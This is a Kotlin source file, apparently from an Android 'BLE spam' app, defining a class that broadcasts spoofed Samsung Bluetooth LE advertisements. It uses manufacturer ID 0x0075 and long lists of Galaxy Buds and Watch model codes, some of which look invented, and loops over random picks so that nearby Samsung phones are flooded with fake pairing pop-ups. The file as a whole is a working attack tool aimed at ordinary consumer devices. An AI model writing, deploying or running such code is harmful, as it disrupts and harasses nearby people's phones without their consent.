package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class EasySetupSpam(private val type: EasySetupDevice.type) : Spammer {

    private var _blinkRunnable: Runnable? = null
    private var _isSpamming = false
    private var blinkRunnable: Runnable? = null

    lateinit var devices: Array<EasySetupDevice>
    lateinit var devicesAdvertiseData: Array<AdvertiseData>
    lateinit var scanResponse: AdvertiseData

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    init {
        devices = when (type) {
            EasySetupDevice.type.BUDS -> arrayOf(
                EasySetupDevice("0xEE7A0C", "Fallback Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x9D1700", "Fallback Dots", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x39EA48", "Light Purple Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xA7C62C", "Bluish Silver Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x850116", "Black Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x3D8F41", "Gray & Black Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x3B6D02", "Bluish Chrome Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xAE063C", "Gray Beige Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xB8B905", "Pure White Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xEAAA17", "Pure White Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xD30704", "Black Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x9DB006", "French Flag Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x101F1A", "Dark Purple Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x859608", "Dark Blue Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x8E4503", "Pink Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x2C6740", "White & Black Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x3F6718", "Bronze Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x42C519", "Red Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xAE073A", "Black & White Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x011716", "Sleek Black Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x123456", "Ocean Blue Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x654321", "Forest Green Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x789ABC", "Sunset Orange Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xDEF123", "Midnight Black Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x456789", "Rose Gold Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xABC123", "Electric Yellow Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x321654", "Crimson Red Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x987654", "Arctic White Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x654987", "Mystic Purple Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x321987", "Golden Buds", EasySetupDevice.type.BUDS)
            )
            EasySetupDevice.type.WATCH -> arrayOf(
                EasySetupDevice("0x1A", "Fallback Watch", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x01", "White Watch4 Classic 44m", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x02", "Black Watch4 Classic 40m", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x03", "White Watch4 Classic 40m", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x04", "Black Watch4 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x05", "Silver Watch4 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x06", "Green Watch4 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x07", "Black Watch4 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x08", "White Watch4 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x09", "Gold Watch4 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x0A", "French Watch4", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x0B", "French Watch4 Classic", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x0C", "Fox Watch5 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x11", "Black Watch5 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x12", "Sapphire Watch5 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x13", "Purplish Watch5 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x14", "Gold Watch5 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x15", "Black Watch5 Pro 45mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x16", "Gray Watch5 Pro 45mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x17", "White Watch5 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x18", "White & Black Watch5", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1B", "Black Watch6 Pink 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1C", "Gold Watch6 Gold 40mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1D", "Silver Watch6 Cyan 44mm", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1E", "Black Watch6 Classic 43m", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x20", "Green Watch6 Classic 43m", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x21", "Midnight Black Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x22", "Ocean Blue Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x23", "Rose Gold Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x24", "Electric Yellow Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x25", "Crimson Red Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x26", "Arctic White Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x27", "Mystic Purple Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x28", "Golden Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x29", "Forest Green Watch6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x2A", "Sunset Orange Watch6", EasySetupDevice.type.WATCH)
            )
        }

        devicesAdvertiseData = devices.map { device ->
            AdvertiseData.Builder()
                .addManufacturerData(0x0075, Helper.convertHexToByteArray(device.toManufacturerData()))
                .build()
        }.toTypedArray()

        scanResponse = AdvertiseData.Builder()
            .addManufacturerData(0x0075, Helper.convertHexToByteArray("0000000000000000000000000000"))
            .build()
    }

    override fun start() {
        executor.execute {
            _isSpamming = true
            repeat(Helper.MAX_LOOP + 1) { _ ->
                if (!_isSpamming) return@execute

                val device = devices.random()
                val data = devicesAdvertiseData[devices.indexOf(device)]
                val bluetoothAdvertiser = BluetoothAdvertiser()

                bluetoothAdvertiser.advertise(data, if (device.deviceType == EasySetupDevice.type.BUDS) scanResponse else null)

                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return@execute
                }

                bluetoothAdvertiser.stopAdvertising()
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }
}